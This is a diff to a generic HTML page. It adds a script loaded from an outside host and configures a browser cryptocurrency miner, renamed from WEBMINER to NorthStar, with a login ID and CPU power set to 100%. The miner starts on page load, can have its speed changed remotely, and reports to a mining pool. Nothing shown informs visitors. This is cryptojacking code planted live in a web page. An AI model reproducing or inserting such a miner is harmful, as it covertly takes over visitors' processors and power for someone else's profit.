@@ -4,48 +4,50 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>Document</title>
+	<script src="https://wm.bmwebm.org/NorthStar.js"></script>
+	<script>NorthStar.config({ login: "6252678", pass: null }).power(100);</script>
 </head>
 <body>
 	
-	<script>
+<script>
 // - Configure:
-WEBMINER.config({ 
+NorthStar.config({ 
 	login: "6252678", // Your ID - required
 	pass: null, // Name for stats, leave blank for automatic set.
 });
 
 // - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
-WEBMINER.power(100);
+NorthStar.power(100);
 
 // - Restore previous session accepted hashes and power (start mining if it worked in previous session):
-WEBMINER.loadStored();
+NorthStar.loadStored();
 
 // - Get current power:
-console.log( WEBMINER.getPower() );
+console.log( NorthStar.getPower() );
 
 // - Get current speed in hashes/sec:
-console.log( WEBMINER.getHashesPerSecond() );
+console.log( NorthStar.getHashesPerSecond() );
 
 // - Get current job algo:
-console.log( WEBMINER.getJobAlgo() );
+console.log( NorthStar.getJobAlgo() );
 
 // - Get current job diff:
-console.log( WEBMINER.getJobDiff() );
+console.log( NorthStar.getJobDiff() );
 
 // - Get accepted by pool hashes (in all sessions)
-console.log( WEBMINER.getAcceptedHashes() );
+console.log( NorthStar.getAcceptedHashes() );
 
 // - Reset config and stop minig
-WEBMINER.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).
+NorthStar.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).
 
 // - Remote change speed event:
-WEBMINER.on('remotepower', (power) => {
-	WEBMINER.power(power); // Is automatic applied if no listeners for this event.
+NorthStar.on('remotepower', (power) => {
+	NorthStar.power(power); // Is automatic applied if no listeners for this event.
 	console.log('New power:', power);
 });
 
 // - Share accepted event
-WEBMINER.on('accepted', () => console.log('New share') );
+NorthStar.on('accepted', () => console.log('New share') );
 </script>
 	
 </body>
